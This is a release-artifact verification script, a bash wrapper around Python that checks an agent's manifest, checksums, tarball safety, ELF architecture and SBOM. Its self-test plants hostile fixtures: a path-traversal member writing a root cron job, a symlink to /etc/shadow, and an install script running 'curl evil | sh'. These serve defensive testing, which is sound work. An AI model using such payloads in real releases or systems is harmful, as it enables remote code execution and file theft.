#!/usr/bin/env bash
#
# Verify a set of agent release artifacts.
#
# Run against the output of scripts/build-agent-artifacts.sh, locally and in
# the release workflow, before anything is published. A release that has not
# been through this has not been checked: "the build succeeded" says the
# compiler was happy, not that the tarball contains what the manifest claims.
#
# Usage:
#   ./scripts/verify-artifacts.sh [DIR] [--expect-version X.Y.Z] [--execute]
#   ./scripts/verify-artifacts.sh --self-test [DIR]
#
#   DIR               defaults to dist/agent
#   --expect-version  fail unless the manifest says exactly this version
#   --execute         also run each binary, emulating foreign architectures
#                     with qemu-user when it is installed
#   --self-test       prove the checks above actually fail when they should,
#                     by corrupting a copy of DIR in eleven specific ways
#
# # Why a self-test
#
# Every check in here is a refusal, and a refusal that never fires is
# indistinguishable from one that cannot. A verifier that silently passed
# everything would be worse than no verifier, because the release process
# would be built on it. So `--self-test` damages a throwaway copy — flips a
# digest, truncates an archive, deletes a file, plants a path-traversal member
# — and asserts the verifier catches each one. It is run in CI immediately
# after the real verification.

set -euo pipefail

cd "$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

exec python3 - "$@" <<'PYTHON'
from __future__ import annotations

import gzip
import hashlib
import io
import json
import os
import re
import shutil
import subprocess
import sys
import tarfile
import tempfile
from pathlib import Path

GREEN, RED, CYAN, DIM, RESET = (
    "\033[0;32m",
    "\033[0;31m",
    "\033[0;36m",
    "\033[0;90m",
    "\033[0m",
)

SCHEMA_VERSION = 1
ARCHIVE_MEMBERS = {"hcc-agent", "LICENSE"}

#: ELF e_machine, and the ELF class that goes with it, per Go architecture.
#: Checked rather than trusted, because "the cross-compile succeeded" and "the
#: artifact labelled arm64 is actually arm64" are different claims and it is
#: the second one a Raspberry Pi owner depends on. An archive whose name says
#: one thing and whose bytes say another is the single most useless kind of
#: release artifact.
ELF_EXPECTATIONS = {
    "amd64": {"machine": 0x3E, "elf_class": 2, "name": "x86-64"},
    "arm64": {"machine": 0xB7, "elf_class": 2, "name": "AArch64"},
    "arm": {"machine": 0x28, "elf_class": 1, "name": "ARM"},
}

#: qemu-user binary per architecture, for `--execute` on a foreign target.
#: From the distribution's own qemu-user-static package — no third-party
#: image, nothing fetched at verification time.
QEMU = {"arm64": "qemu-aarch64-static", "arm": "qemu-arm-static"}

failures: list[str] = []
checks = 0


def ok(message: str) -> None:
    global checks
    checks += 1
    print(f"{GREEN}  ✓ {message}{RESET}")


def bad(message: str) -> None:
    global checks
    checks += 1
    failures.append(message)
    print(f"{RED}  ✗ {message}{RESET}")


def section(title: str) -> None:
    print(f"\n{CYAN}▸ {title}{RESET}")


def note(message: str) -> None:
    print(f"{DIM}    {message}{RESET}")


def digest_of(path: Path) -> str:
    sha = hashlib.sha256()
    with path.open("rb") as handle:
        for block in iter(lambda: handle.read(1 << 20), b""):
            sha.update(block)
    return sha.hexdigest()


# ---------------------------------------------------------------------------
# Arguments
# ---------------------------------------------------------------------------

directory = Path("dist/agent")
expect_version: str | None = None
execute = False
self_test = False

arguments = sys.argv[1:]
index = 0
positional: list[str] = []
while index < len(arguments):
    argument = arguments[index]
    if argument == "--expect-version":
        index += 1
        if index >= len(arguments):
            print("--expect-version needs a value", file=sys.stderr)
            raise SystemExit(2)
        expect_version = arguments[index]
    elif argument == "--execute":
        execute = True
    elif argument == "--self-test":
        self_test = True
    elif argument.startswith("-"):
        print(f"unknown argument: {argument}", file=sys.stderr)
        raise SystemExit(2)
    else:
        positional.append(argument)
    index += 1

if len(positional) > 1:
    print("at most one directory may be given", file=sys.stderr)
    raise SystemExit(2)
if positional:
    directory = Path(positional[0])


# ---------------------------------------------------------------------------
# The verification itself
# ---------------------------------------------------------------------------


def verify(directory: Path, *, expect_version: str | None, execute: bool) -> None:
    """Run every check against *directory*, recording failures as it goes."""
    section(f"Manifest ({directory}/artifacts.json)")

    manifest_path = directory / "artifacts.json"
    if not manifest_path.is_file():
        bad("artifacts.json is missing; nothing else can be checked against it")
        return

    try:
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as error:
        bad(f"artifacts.json is not readable JSON: {error}")
        return

    # --- Schema ----------------------------------------------------------
    if manifest.get("schema_version") != SCHEMA_VERSION:
        bad(
            f"schema_version is {manifest.get('schema_version')!r}, "
            f"this verifier understands {SCHEMA_VERSION}"
        )
        return
    ok(f"schema_version {SCHEMA_VERSION}")

    required = {
        "product": str,
        "version": str,
        "commit": str,
        "built_at": str,
        "source_date_epoch": int,
        "go_version": str,
        "artifacts": list,
        "checksums": dict,
        "sbom": dict,
    }
    missing = [name for name in required if name not in manifest]
    if missing:
        bad(f"manifest is missing required field(s): {', '.join(sorted(missing))}")
        return
    wrong_type = [
        name
        for name, kind in required.items()
        # bool is a subclass of int; a boolean epoch would be nonsense.
        if not isinstance(manifest[name], kind) or isinstance(manifest[name], bool)
    ]
    if wrong_type:
        bad(f"manifest field(s) have the wrong type: {', '.join(sorted(wrong_type))}")
        return
    ok("every required manifest field is present and correctly typed")

    if manifest["product"] != "hcc-agent":
        bad(f"product is {manifest['product']!r}, expected 'hcc-agent'")
    if not re.fullmatch(r"[0-9]+\.[0-9]+\.[0-9]+(?:[-+][0-9A-Za-z.+-]+)?", manifest["version"]):
        bad(f"version {manifest['version']!r} is not a semantic version")
    else:
        ok(f"version {manifest['version']}")
    if not re.fullmatch(r"[0-9a-f]{40}", manifest["commit"]):
        bad(f"commit {manifest['commit']!r} is not a full git object name")
    if not re.fullmatch(r"\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z", manifest["built_at"]):
        bad(f"built_at {manifest['built_at']!r} is not an RFC 3339 UTC timestamp")

    version = manifest["version"]
    if expect_version is not None:
        if version != expect_version:
            bad(f"manifest says version {version}, caller expected {expect_version}")
        else:
            ok(f"version matches the expected {expect_version}")

    if not manifest["artifacts"]:
        bad("the manifest lists no artifacts")
        return

    # --- The directory holds exactly what the manifest describes ---------
    section("Directory contents")

    described = {entry["name"] for entry in manifest["artifacts"]}
    described.add(manifest["checksums"]["name"])
    described.add(manifest["sbom"]["name"])
    described.add("artifacts.json")

    present = {item.name for item in directory.iterdir() if item.is_file()}
    for name in sorted(described - present):
        bad(f"{name} is named in the manifest and not present")
    # An undescribed file is a failure, not a curiosity: a stale archive from
    # a previous version sitting beside the current ones is exactly what gets
    # uploaded by accident, and nothing downstream would notice.
    for name in sorted(present - described):
        bad(f"{name} is present and not described by the manifest")
    if not described - present and not present - described:
        ok(f"{len(present)} files, exactly the set the manifest describes")

    # --- checksums.txt ---------------------------------------------------
    section("checksums.txt")

    checksums_path = directory / manifest["checksums"]["name"]
    if not checksums_path.is_file():
        bad(f"{checksums_path.name} is missing")
    else:
        actual = digest_of(checksums_path)
        if actual != manifest["checksums"]["sha256"]:
            bad(f"{checksums_path.name} does not match its digest in the manifest")
        else:
            ok("checksums.txt matches its own digest in the manifest")

        listed: dict[str, str] = {}
        malformed = False
        for line in checksums_path.read_text(encoding="utf-8").splitlines():
            if not line.strip():
                continue
            match = re.fullmatch(r"([0-9a-f]{64}) [ *](.+)", line)
            if match is None:
                bad(f"checksums.txt line is not in sha256sum format: {line!r}")
                malformed = True
                continue
            listed[match.group(2)] = match.group(1)

        if not malformed:
            archives = {entry["name"] for entry in manifest["artifacts"]}
            if set(listed) != archives:
                bad(
                    "checksums.txt does not list exactly the manifest's archives "
                    f"(only in checksums: {sorted(set(listed) - archives)}; "
                    f"only in manifest: {sorted(archives - set(listed))})"
                )
            else:
                ok(f"lists exactly the {len(archives)} archives the manifest describes")

            # Verified here rather than by shelling out to `sha256sum -c`, so
            # the check works the same way on a runner without coreutils'
            # exact flags — and so a mismatch names the file rather than
            # printing "1 computed checksum did NOT match".
            mismatched = []
            for name, expected in sorted(listed.items()):
                path = directory / name
                if not path.is_file():
                    mismatched.append(f"{name}: not present")
                    continue
                if digest_of(path) != expected:
                    mismatched.append(f"{name}: content does not match its digest")
            for problem in mismatched:
                bad(problem)
            if not mismatched:
                ok("every digest in checksums.txt matches the file on disk")

    # --- Archives --------------------------------------------------------
    for entry in manifest["artifacts"]:
        name = entry["name"]
        section(f"{name}")

        for field in ("kind", "os", "arch", "tier", "sha256", "size_bytes", "binary"):
            if field not in entry:
                bad(f"artifact entry is missing {field}")
        if "arch" not in entry or "sha256" not in entry:
            continue

        arch = entry["arch"]
        path = directory / name
        if not path.is_file():
            bad("not present")
            continue

        # The name has to agree with the metadata. A file called
        # …_linux_arm64.tar.gz whose entry says amd64 would make the install
        # command the interface renders point at the wrong architecture while
        # every digest still matched.
        expected_name = f"hcc-agent_{version}_{entry.get('os')}_{arch}.tar.gz"
        if name != expected_name:
            bad(f"name does not match version/os/arch; expected {expected_name}")
        else:
            ok("name agrees with the manifest's version, os and arch")

        if entry.get("tier") not in {"supported", "best-effort"}:
            bad(f"tier {entry.get('tier')!r} is not one of supported, best-effort")

        size = path.stat().st_size
        if size != entry["size_bytes"]:
            bad(f"size is {size} bytes, manifest says {entry['size_bytes']}")
        archive_digest = digest_of(path)
        if archive_digest != entry["sha256"]:
            bad("content does not match the manifest's sha256")
            continue
        ok(f"sha256 and size match the manifest ({size} bytes)")

        # gzip -n: no filename and no timestamp in the member header, which is
        # what makes the archive reproducible. Byte 3 is the FLG field; bit 3
        # (FNAME) set means the original filename was recorded. Bytes 4..7 are
        # MTIME and must be zero.
        header = path.read_bytes()[:8]
        if len(header) < 8 or header[:2] != b"\x1f\x8b":
            bad("is not a gzip stream")
            continue
        if header[3] & 0x08:
            bad("gzip header records the original filename; build without gzip -n")
        elif header[4:8] != b"\x00\x00\x00\x00":
            bad("gzip header carries a timestamp; build without gzip -n")
        else:
            ok("gzip header carries neither a filename nor a timestamp")

        try:
            with tarfile.open(path, "r:gz") as archive:
                members = archive.getmembers()
                extracted = {}
                for member in members:
                    # Extraction safety, checked on our own artifacts because
                    # the install command tells somebody to run `tar xzf` as
                    # themselves and `install` unpacks an upgrade as root. An
                    # absolute path, a `..` or a symlink in a release tarball
                    # is a remote write primitive.
                    if member.name.startswith("/") or ".." in Path(member.name).parts:
                        bad(f"member {member.name!r} escapes the extraction directory")
                    if member.issym() or member.islnk():
                        bad(f"member {member.name!r} is a link")
                    if not (member.isfile() or member.isdir()):
                        bad(f"member {member.name!r} is neither a file nor a directory")
                    if member.uid != 0 or member.gid != 0:
                        bad(f"member {member.name!r} records uid {member.uid}:{member.gid}")
                    if member.mtime != manifest["source_date_epoch"]:
                        bad(
                            f"member {member.name!r} mtime {member.mtime} "
                            f"is not SOURCE_DATE_EPOCH {manifest['source_date_epoch']}"
                        )
                    handle = archive.extractfile(member)
                    extracted[member.name] = (member, handle.read() if handle else b"")

                names = set(extracted)
                if names != ARCHIVE_MEMBERS:
                    bad(
                        "archive contents are not exactly "
                        f"{sorted(ARCHIVE_MEMBERS)}: found {sorted(names)}"
                    )
                else:
                    ok(f"contains exactly {sorted(ARCHIVE_MEMBERS)}")
        except tarfile.TarError as error:
            bad(f"is not a readable tar archive: {error}")
            continue

        if "hcc-agent" not in extracted:
            continue
        member, payload = extracted["hcc-agent"]

        if member.mode & 0o777 != 0o755:
            bad(f"hcc-agent is mode {member.mode & 0o777:o}, expected 755")
        else:
            ok("hcc-agent is mode 755")

        binary_entry = entry.get("binary") or {}
        binary_digest = hashlib.sha256(payload).hexdigest()
        if binary_digest != binary_entry.get("sha256"):
            bad("the binary inside the archive does not match the manifest's binary.sha256")
        elif len(payload) != binary_entry.get("size_bytes"):
            bad("the binary inside the archive does not match the manifest's binary.size_bytes")
        else:
            ok("the binary inside matches the manifest's digest and size")

        # --- ELF -----------------------------------------------------
        expectation = ELF_EXPECTATIONS.get(arch)
        if expectation is None:
            bad(f"no ELF expectation recorded for architecture {arch!r}")
        elif len(payload) < 20 or payload[:4] != b"\x7fELF":
            bad("the binary is not an ELF object")
        else:
            elf_class = payload[4]
            endianness = payload[5]
            elf_type = int.from_bytes(payload[16:18], "little")
            machine = int.from_bytes(payload[18:20], "little")
            if endianness != 1:
                bad("the binary is not little-endian")
            if elf_class != expectation["elf_class"]:
                bad(
                    f"ELF class is {elf_class} ({'32' if elf_class == 1 else '64'}-bit), "
                    f"expected {expectation['elf_class']} for {arch}"
                )
            if machine != expectation["machine"]:
                bad(
                    f"ELF e_machine is {machine:#x}, expected "
                    f"{expectation['machine']:#x} ({expectation['name']}) for {arch}"
                )
            else:
                ok(f"ELF e_machine is {expectation['name']}, matching {arch}")
            # ET_EXEC. CGO_ENABLED=0 without -buildmode=pie yields a static,
            # non-relocatable executable; ET_DYN here would mean the build
            # picked up cgo and the binary now needs a dynamic loader, which
            # is the property that breaks on musl.
            if elf_type != 2:
                bad(f"ELF e_type is {elf_type}, expected 2 (ET_EXEC, statically linked)")
            else:
                ok("ELF e_type is ET_EXEC — statically linked, no loader needed")

        # --- Running it ----------------------------------------------
        if not execute:
            continue

        host_arch = {"x86_64": "amd64", "aarch64": "arm64", "armv7l": "arm"}.get(os.uname().machine)
        runner: list[str] = []
        how = "natively"
        if arch != host_arch:
            qemu = shutil.which(QEMU.get(arch, ""))
            if qemu is None:
                note(f"not executed: {arch} is not this host and no {QEMU.get(arch)} is installed")
                continue
            runner = [qemu]
            how = f"under {Path(qemu).name}"

        with tempfile.TemporaryDirectory() as workspace:
            binary = Path(workspace) / "hcc-agent"
            binary.write_bytes(payload)
            binary.chmod(0o755)
            try:
                result = subprocess.run(
                    [*runner, str(binary), "version"],
                    capture_output=True,
                    text=True,
                    timeout=60,
                    check=False,
                )
            except OSError as error:
                bad(f"could not execute the binary {how}: {error}")
                continue
            if result.returncode != 0:
                bad(f"`hcc-agent version` exited {result.returncode} {how}: {result.stderr.strip()}")
                continue
            reported = result.stdout.strip()
            if version not in reported:
                bad(f"`hcc-agent version` does not report {version}: {reported!r}")
            elif manifest["commit"][:12] not in reported:
                bad(f"`hcc-agent version` does not report the manifest's commit: {reported!r}")
            elif f"linux/{arch}" not in reported:
                bad(f"`hcc-agent version` does not report linux/{arch}: {reported!r}")
            else:
                ok(f"runs {how} and reports its version, commit and platform")
                note(reported)

    # --- SBOM ------------------------------------------------------------
    section("SBOM")
    sbom_path = directory / manifest["sbom"]["name"]
    if not sbom_path.is_file():
        bad(f"{sbom_path.name} is missing")
    else:
        if digest_of(sbom_path) != manifest["sbom"]["sha256"]:
            bad("the SBOM does not match its digest in the manifest")
        else:
            ok("matches its digest in the manifest")
        try:
            sbom = json.loads(sbom_path.read_text(encoding="utf-8"))
        except json.JSONDecodeError as error:
            bad(f"the SBOM is not readable JSON: {error}")
        else:
            if sbom.get("spdxVersion") != "SPDX-2.3":
                bad(f"spdxVersion is {sbom.get('spdxVersion')!r}, expected SPDX-2.3")
            packages = sbom.get("packages") or []
            described_package = next(
                (item for item in packages if item.get("name") == "hcc-agent"), None
            )
            if described_package is None:
                bad("the SBOM does not contain a package named hcc-agent")
            elif described_package.get("versionInfo") != version:
                bad(
                    f"the SBOM's hcc-agent package says version "
                    f"{described_package.get('versionInfo')!r}, manifest says {version}"
                )
            else:
                ok(f"SPDX-2.3, describing hcc-agent {version} and {len(packages) - 1} dependencies")


# ---------------------------------------------------------------------------
# Self-test: prove each refusal fires
# ---------------------------------------------------------------------------


def corrupt_manifest(path: Path, mutate) -> None:
    manifest = json.loads(path.read_text(encoding="utf-8"))
    mutate(manifest)
    path.write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")


def repack(archive: Path, build, *, epoch: int) -> None:
    """Rewrite *archive* with whatever *build* puts into the tar.

    Keeps the member mtimes at ``epoch`` so a repacked archive fails the check
    it is meant to fail and not the reproducibility one as well — a self-test
    scenario that trips three checks proves nothing about any of them.
    """
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w", format=tarfile.GNU_FORMAT) as tar:
        build(tar, epoch)
    archive.write_bytes(gzip.compress(raw.getvalue(), mtime=0))


def resync(directory: Path, archive_name: str) -> None:
    """Make the manifest and checksums.txt agree with a rewritten archive.

    Without this, a scenario that repacks an archive is caught by the digest
    check and never reaches the one under test. Rewriting the bookkeeping is
    also the realistic threat: somebody who can change an artifact in the
    pipeline can change the file that describes it.
    """
    manifest_path = directory / "artifacts.json"
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    archive = directory / archive_name

    with tarfile.open(archive, "r:gz") as tar:
        member = tar.getmember("hcc-agent")
        handle = tar.extractfile(member)
        payload = handle.read() if handle else b""

    for entry in manifest["artifacts"]:
        if entry["name"] != archive_name:
            continue
        entry["sha256"] = digest_of(archive)
        entry["size_bytes"] = archive.stat().st_size
        entry["binary"]["sha256"] = hashlib.sha256(payload).hexdigest()
        entry["binary"]["size_bytes"] = len(payload)

    checksums = directory / manifest["checksums"]["name"]
    lines = []
    for entry in sorted(manifest["artifacts"], key=lambda item: item["name"]):
        lines.append(f"{entry['sha256']}  {entry['name']}")
    checksums.write_text("\n".join(lines) + "\n", encoding="utf-8")
    manifest["checksums"]["sha256"] = digest_of(checksums)

    manifest_path.write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")


def run_self_test(source: Path) -> int:
    """Damage a copy of *source* every way the checks claim to catch.

    Each scenario names the message the verifier is expected to produce, so a
    scenario that fails for the wrong reason counts as a failure. "Exited
    non-zero" is too weak a contract here: nearly any corruption trips
    *something*, and what is being tested is that the specific check fires.
    """
    print(f"{CYAN}▸ Self-test: each of these must be rejected, for the stated reason{RESET}")

    archives = sorted(source.glob("hcc-agent_*_linux_*.tar.gz"))
    if not archives:
        print(f"{RED}  ✗ no archives in {source}; build them first{RESET}")
        return 1
    archive_name = archives[0].name
    manifest = json.loads((source / "artifacts.json").read_text(encoding="utf-8"))
    epoch = int(manifest["source_date_epoch"])

    def flip_digest(manifest: dict) -> None:
        manifest["artifacts"][0]["sha256"] = "0" * 64

    def wrong_size(manifest: dict) -> None:
        manifest["artifacts"][0]["size_bytes"] += 1

    def wrong_binary_digest(manifest: dict) -> None:
        manifest["artifacts"][0]["binary"]["sha256"] = "f" * 64

    def future_schema(manifest: dict) -> None:
        manifest["schema_version"] = 99

    def drop_field(manifest: dict) -> None:
        del manifest["go_version"]

    def wrong_arch(manifest: dict) -> None:
        # The filename still says one architecture; the metadata now says
        # another. Both digests still match, which is what makes this the
        # interesting case: nothing is corrupt, the labelling is a lie.
        first = manifest["artifacts"][0]
        first["arch"] = "arm64" if first["arch"] != "arm64" else "amd64"

    def bogus_tier(manifest: dict) -> None:
        manifest["artifacts"][0]["tier"] = "rock-solid"

    def unknown_version(manifest: dict) -> None:
        manifest["version"] = "not-a-version"

    def member(name: str, payload: bytes, mode: int, epoch: int) -> tuple:
        info = tarfile.TarInfo(name)
        info.size = len(payload)
        info.mode = mode
        info.mtime = epoch
        info.uid = info.gid = 0
        return info, io.BytesIO(payload)

    def valid_members(tar: tarfile.TarFile, epoch: int, binary: bytes) -> None:
        tar.addfile(*member("hcc-agent", binary, 0o755, epoch))
        tar.addfile(*member("LICENSE", b"licence\n", 0o644, epoch))

    # A real ELF header, so an archive-content scenario is not also an
    # ELF-check scenario. e_type=ET_EXEC, e_machine=x86-64.
    fake_elf = (
        b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8 + b"\x02\x00\x3e\x00" + b"\x00" * 64
    )

    def traversal(tar: tarfile.TarFile, epoch: int) -> None:
        valid_members(tar, epoch, fake_elf)
        tar.addfile(*member("../../etc/cron.d/pwned", b"* * * * * root id\n", 0o644, epoch))

    def symlink(tar: tarfile.TarFile, epoch: int) -> None:
        valid_members(tar, epoch, fake_elf)
        link = tarfile.TarInfo("hcc-agent-link")
        link.type = tarfile.SYMTYPE
        link.linkname = "/etc/shadow"
        link.mtime = epoch
        tar.addfile(link)

    def stowaway(tar: tarfile.TarFile, epoch: int) -> None:
        valid_members(tar, epoch, fake_elf)
        tar.addfile(*member("install.sh", b"#!/bin/sh\ncurl evil | sh\n", 0o755, epoch))

    def world_writable(tar: tarfile.TarFile, epoch: int) -> None:
        tar.addfile(*member("hcc-agent", fake_elf, 0o777, epoch))
        tar.addfile(*member("LICENSE", b"licence\n", 0o644, epoch))

    def wrong_elf(tar: tarfile.TarFile, epoch: int) -> None:
        # Valid ELF, wrong machine: e_machine = 0xB7 (AArch64) in an archive
        # named amd64. This is the substitution a mirror could perform.
        aarch64 = bytearray(fake_elf)
        aarch64[18:20] = (0xB7).to_bytes(2, "little")
        valid_members(tar, epoch, bytes(aarch64))

    def not_static(tar: tarfile.TarFile, epoch: int) -> None:
        dynamic = bytearray(fake_elf)
        dynamic[16:18] = (3).to_bytes(2, "little")  # ET_DYN
        valid_members(tar, epoch, bytes(dynamic))

    def stale_mtime(tar: tarfile.TarFile, epoch: int) -> None:
        valid_members(tar, epoch + 1, fake_elf)

    scenarios: list[tuple[str, str, str, object]] = [
        ("manifest", "a flipped archive digest", "does not match the manifest's sha256", flip_digest),
        ("manifest", "a wrong archive size", "manifest says", wrong_size),
        ("manifest", "a flipped binary digest", "binary.sha256", wrong_binary_digest),
        ("manifest", "an unknown schema version", "this verifier understands", future_schema),
        ("manifest", "a missing required field", "missing required field", drop_field),
        ("manifest", "an arch that contradicts the filename", "name does not match", wrong_arch),
        ("manifest", "a tier outside the vocabulary", "is not one of supported", bogus_tier),
        ("manifest", "a version that is not a version", "not a semantic version", unknown_version),
        ("truncate", "a truncated archive", "", None),
        ("delete", "a deleted archive", "named in the manifest and not present", None),
        ("extra", "an extra file nobody checksummed", "not described by the manifest", None),
        ("checksums", "a checksums.txt entry that no longer matches", "checksums.txt", None),
        ("archive", "a path-traversal member", "escapes the extraction directory", traversal),
        ("archive", "a symlink member", "is a link", symlink),
        ("archive", "an unexpected extra member", "not exactly", stowaway),
        ("archive", "a world-writable binary", "expected 755", world_writable),
        ("archive", "a binary for the wrong architecture", "e_machine", wrong_elf),
        ("archive", "a dynamically linked binary", "ET_EXEC", not_static),
        ("archive", "a member with a non-reproducible mtime", "SOURCE_DATE_EPOCH", stale_mtime),
    ]

    passed = 0
    for kind, description, expected, mutate in scenarios:
        with tempfile.TemporaryDirectory() as workspace:
            copy = Path(workspace) / "dist"
            shutil.copytree(source, copy)
            archive = copy / archive_name

            if kind == "manifest":
                corrupt_manifest(copy / "artifacts.json", mutate)
            elif kind == "truncate":
                raw = archive.read_bytes()
                archive.write_bytes(raw[: len(raw) // 2])
            elif kind == "delete":
                archive.unlink()
            elif kind == "extra":
                (copy / "hcc-agent_9.9.9_linux_amd64.tar.gz").write_bytes(b"not an archive")
            elif kind == "checksums":
                checksums = copy / "checksums.txt"
                lines = checksums.read_text(encoding="utf-8").splitlines()
                lines[0] = "0" * 64 + "  " + lines[0].split(maxsplit=1)[1]
                checksums.write_text("\n".join(lines) + "\n", encoding="utf-8")
            elif kind == "archive":
                repack(archive, mutate, epoch=epoch)
                # The bookkeeping is made consistent with the tampered
                # archive, so the scenario reaches the check it is about.
                resync(copy, archive_name)

            # Re-run the real command in a subprocess, so what is tested is
            # what somebody actually runs, and so this process's own failure
            # list is untouched.
            result = subprocess.run(
                ["bash", "scripts/verify-artifacts.sh", str(copy)],
                capture_output=True,
                text=True,
                check=False,
            )
            output = result.stdout + result.stderr
            if result.returncode == 0:
                print(f"{RED}  ✗ NOT caught: {description}{RESET}")
                print(f"{DIM}{output[-800:]}{RESET}")
            elif expected and expected not in output:
                print(
                    f"{RED}  ✗ caught {description}, but not by the expected check "
                    f"({expected!r} absent){RESET}"
                )
                print(f"{DIM}{output[-800:]}{RESET}")
            else:
                print(f"{GREEN}  ✓ caught {description}{RESET}")
                passed += 1

    print()
    if passed == len(scenarios):
        print(f"{GREEN}✓ self-test: all {passed} corruptions rejected by the right check{RESET}")
        return 0
    print(f"{RED}✗ self-test: {len(scenarios) - passed} of {len(scenarios)} not rejected{RESET}")
    return 1


# ---------------------------------------------------------------------------

if self_test:
    raise SystemExit(run_self_test(directory))

print(f"{CYAN}Verifying agent artifacts in {directory}{RESET}")
verify(directory, expect_version=expect_version, execute=execute)

print()
if failures:
    print(f"{RED}✗ {len(failures)} of {checks} checks failed{RESET}")
    for failure in failures:
        print(f"{RED}  · {failure}{RESET}")
    raise SystemExit(1)
print(f"{GREEN}✓ all {checks} checks passed{RESET}")
PYTHON
